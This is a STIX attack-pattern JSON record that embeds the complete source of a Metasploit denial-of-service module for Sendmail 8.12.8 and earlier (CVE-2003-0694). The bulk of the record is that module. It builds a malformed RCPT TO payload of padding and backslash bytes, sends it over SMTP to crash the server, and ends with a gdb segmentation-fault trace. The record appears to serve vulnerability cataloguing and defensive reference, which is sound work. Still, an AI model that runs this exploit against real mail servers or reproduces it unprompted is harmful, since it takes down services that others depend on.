{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f310b4a1-66d3-4cfc-9fce-d39290cb0232",
    "created": "2024-08-14T16:24:35.776629Z",
    "modified": "2024-08-14T16:24:35.776634Z",
    "name": "Sendmail SMTP Address prescan Memory Corruption",
    "description": " This is a proof of concept denial of service module for Sendmail versions 8.12.8 and earlier. The vulnerability is within the prescan() method when parsing SMTP headers. Due to the prescan function, only 0x5c and 0x00 bytes can be used, limiting the likelihood for arbitrary code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/smtp/sendmail_prescan.rb",
            "external_id": "sendmail_prescan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0694"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Smtp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sendmail SMTP Address prescan Memory Corruption',\n      'Description'    => %q{\n        This is a proof of concept denial of service module for Sendmail versions\n        8.12.8 and earlier. The vulnerability is within the prescan() method when\n        parsing SMTP headers. Due to the prescan function, only 0x5c and 0x00\n        bytes can be used, limiting the likelihood for arbitrary code execution.\n      },\n      'Author'         => [ 'aushack' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '2577' ],\n          [ 'CVE', '2003-0694' ],\n          [ 'BID', '8641' ],\n          [ 'EDB', '24' ]\n        ],\n      'DisclosureDate' => '2003-09-17'))\n  end\n\n  def run\n    begin\n      connect\n      # we use connect instead of connect_login,\n      # because we send our own malicious RCPT.\n      # however we want to make use of MAILFROM\n      # and raw_send_recv()\n      #select(nil,nil,nil,23) # so we can attach gdb to the child PID\n\n      sploit = (\"A\" * 255 + \";\") * 4 + \"A\" * 217 + \";\" + \"\\x5c\\xff\" * 28\n\n      raw_send_recv(\"EHLO X\\r\\n\")\n      raw_send_recv(\"MAIL FROM: #{datastore['MAILFROM']}\\r\\n\")\n      print_status(\"Sending DoS packet.\")\n      raw_send_recv(\"RCPT TO: #{sploit}\\r\\n\")\n\n      disconnect\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_status(\"Couldn't connect to #{rhost}:#{rport}\")\n    rescue ::EOFError\n      print_status(\"Sendmail stopped responding after sending trigger - target vulnerable.\")\n    end\n\n  end\nend\n\n=begin\nProgram received signal SIGSEGV, Segmentation fault.\n0x8073499 in ?? ()\n(gdb) bt\n#0   0x807e499 in ?? ()\n#1   0x087e125 in ?? ()\n#2   0x5c5c5c5c in ?? ()\nError accessing memory address 0x5c5c5c5c: Bad address.\n=end\n",
    "x_mitre_disclosure_date": "2003-09-17"
}